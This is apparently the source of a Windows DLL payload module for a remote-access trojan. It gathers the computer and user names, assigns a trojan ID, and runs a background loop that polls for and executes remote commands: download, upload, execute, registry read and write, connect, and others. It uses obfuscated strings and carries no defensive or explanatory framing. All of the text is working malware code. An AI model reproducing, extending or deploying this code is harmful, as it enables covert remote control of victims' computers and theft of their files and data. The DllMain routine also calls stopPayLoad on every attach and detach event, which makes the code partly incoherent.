/* Replace "dll.h" with the name of your header */
#include "../include/dll.h"
#include <windows.h>
#include <stdio.h>
#include "../../shared/include/loadDll.h"
#include "../../shared/include/CHTTPClass.h"
#include "../include/ComManager.h"
#include "../include/function.h"
#include "../../shared/include/maindef.h"
#include "../../shared/include/osversion.h"
#include "../../shared/include/ofuscstring.h"

DLLHANDLER pDllHandler;
bool bStopMainThread=0;
API pApi;


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
             stopPayLoad();
			break;
    }
    return TRUE;
}


extern "C" __declspec (dllexport) int getVersion(void)
{
     return _VERSION; 
}

DWORD WINAPI CommanderWorkerProcess(IN LPVOID vThreadParam)
{
      COMMAND *command1;

      while (!bStopMainThread) {
            command1=CheckCommand(&pApi);
            if (command1) {
               ExecuteCommand(&pApi,command1);
               FinalizeCommand(&pApi,command1);
            }
            _sleep(pApi.lTimeToSleep);
      }
      freeLibraries(&pDllHandler);
      bStopMainThread=0;
      return 0;
}

DWORD StartCommander(void)
{
	HANDLE   hThread;
    DWORD    dwThreadID;
	objParamThread stThreadParam;
	DWORD dwReturnCode;
	hThread = CreateThread(
                     NULL,            // Pointer to thread security attributes
                     0,               // Initial thread stack size, in bytes
                     CommanderWorkerProcess,  // Pointer to thread function
                     NULL,     // The argument for the new thread
                     0,               // Creation flags
                     &dwThreadID      // Pointer to returned thread identifier
                 );
    return 0;
}

extern "C" __declspec (dllexport) void stopPayLoad(void) {
    bStopMainThread=1;
    while (bStopMainThread) {
          _sleep(10000);            
    }
}    
       
extern "C" __declspec (dllexport) void startPayLoad(PARAMETERS *pParam) {
    DWORD dwLenght;DWORD i;
    
    StringPlainText();
    loadLibraryWinInet(&pDllHandler,&pApi);
    loadLibraryShell32(&pDllHandler,&pApi);
    loadLibraryAdvAPI32(&pDllHandler,&pApi);
    loadLibrarySocket(&pDllHandler,&pApi);
    
    strncpy(pApi.sInstalledKey,pParam->sInstalledKey,MAX_PATH);
    strncpy(pApi.sInstalledRep,pParam->sInstalledRep,MAX_PATH);
    strncpy(pApi.sTmpDirectory,pParam->sTmpDirectory,MAX_PATH);
    strncpy(pApi.sWindowsVersion,pParam->sWindowsVersion,MAX_PATH);
    strncpy(pApi.sComputerName,pParam->sComputerName,MAX_PATH);
    strncpy(pApi.sUserName,pParam->sUserName,MAX_PATH);

    for (i=0;i<strlen(pApi.sComputerName);i++)
        pApi.idTroj+=pApi.sComputerName[i]*i*70+pApi.sComputerName[i];    
        
    pApi.lTimeToSleep=_DELAYCOMMANDER;
    
    ReferenceCommand(_CMD_DOWNLOAD,&COMMAND_download);
    ReferenceCommand(_CMD_UPLOAD,&COMMAND_upload);
    ReferenceCommand(_CMD_EXECUTE,&COMMAND_execute);
    ReferenceCommand(_CMD_MESSAGEBOX,&COMMAND_MessageBox);
    //ReferenceCommand(_CMD_UPDATE,&COMMAND_Update);
    ReferenceCommand(_CMD_GETINFO,&COMMAND_getInfo);
    ReferenceCommand(_CMD_GETREGVALUE,&COMMAND_GetRegKey);
    ReferenceCommand(_CMD_SETREGVALUE,&COMMAND_SetRegKey);
    ReferenceCommand(_CMD_SETTTS,&COMMAND_TTS);
    ReferenceCommand(_CMD_CONNECT,&COMMAND_CONNECT);

    StartCommander(); 
}
